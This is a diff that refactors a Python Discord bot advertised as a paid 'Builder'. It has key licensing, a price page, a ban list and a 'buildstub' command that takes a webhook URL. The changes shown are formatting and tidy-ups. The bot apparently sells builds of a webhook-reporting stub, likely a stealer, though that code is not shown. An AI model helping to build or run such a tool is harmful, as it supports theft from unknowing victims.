@@ -109,17 +109,21 @@ async def unbanu(ctx, user_id: int):
 async def lolhelpdude(ctx):
     if ctx.message.author.id in blacklist:
         embed=discord.Embed(title=f"{config['name']}", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ===================================>
 
       You Are Banned From Bot
 
 ===================================>
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
     else:
         embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=int(config['embedcolor'], 16))
-        embed.add_field(name=f"Help : All Commands", value=f"""
+        embed.add_field(
+            name="Help : All Commands",
+            value=f"""
         **===================== Client Commands =====================**
 
         **+features**```Command to show all {config['name']} features```
@@ -135,71 +139,89 @@ async def lolhelpdude(ctx):
         **+ban <userid>**```Ban a user```
         **+unban <userid>**```Unban a user```
 
-        """)
-        await ctx.send(embed=embed)
+        """,
+        )
+
+    await ctx.send(embed=embed)
 
 @bot.command(name='features')
 async def sfeatures(ctx):
     if ctx.message.author.id in blacklist:
         embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ===================================>
 
       You Are Banned From Bot
 
 ===================================>
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
     else:
     # Create an embed message
         embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Features", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Features",
+            value="""```
 
 CUSTOMIZE THIS
 
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
+
+    await ctx.send(embed=embed)
 
 @bot.command(name='about')
 async def abu(ctx):
     if ctx.message.author.id in blacklist:
         embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ===================================>
 
       You Are Banned From Bot
 
 ===================================>
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
     else:
     # Create an embed message
-       embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-       embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ============= ABOUT US ===========>
 
                DESC 
 
 ===================================>
-```""")
-       await ctx.send(embed=embed)
+```""",
+        )
+
+    await ctx.send(embed=embed)
 
 @bot.command(name='info')
 async def inf(ctx):
     if ctx.message.author.id in blacklist:
         embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ===================================>
 
       You Are Banned From Bot
 
 ===================================>
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
     else:
     # Create an embed message
-       embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-       embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ============= Developer ==========>
 
        Bot By synthetic#1337  
@@ -209,38 +231,46 @@ async def inf(ctx):
             Prefix [+]
 
 ===================================>
-```""")
-       await ctx.send(embed=embed)
+```""",
+        )
+
+    await ctx.send(embed=embed)
 
 @bot.command(name='price')
 async def ss(ctx):
     if ctx.message.author.id in blacklist:
         embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-        embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ===================================>
 
       You Are Banned From Bot
 
 ===================================>
-```""")
-        await ctx.send(embed=embed)
+```""",
+        )
     else:
     # Create an embed message
-       embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
-       embed.add_field(name=f"{config['name']} Info", value=f"""```
+        embed=discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
+        embed.add_field(
+            name=f"{config['name']} Info",
+            value="""```
 ============== PRICES =============>
 
          Your Prices here
 
 ===================================>
-```""")
-       await ctx.send(embed=embed)
+```""",
+        )
+
+    await ctx.send(embed=embed)
 
 def generatek():
-    key = ""
-    for i in range(10):
-        key += random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-    return key
+    return "".join(
+        random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
+        for _ in range(10)
+    )
 
 @bot.command(name='genkey')
 async def genkeyy(ctx, user_id: str):
@@ -298,11 +328,11 @@ async def buildstub(ctx, webhook: str, key: str = "default"):
     else:
         with open("KEYS.txt", "r") as f:
             keys = [line.strip().split(":") for line in f.readlines()]
-        valid_key = any(k == [str(ctx.author.id), key] for k in keys)
+        valid_key = [str(ctx.author.id), key] in keys
         if not valid_key:
             await ctx.send("Sorry, that's not your key silly :smiling_face_with_3_hearts: :scream: :heart_eyes: :stuck_out_tongue: :money_mouth:")
             return
-        
+
         loop = asyncio.get_event_loop()
         await loop.run_in_executor(CEE, casw, ctx, webhook)
     
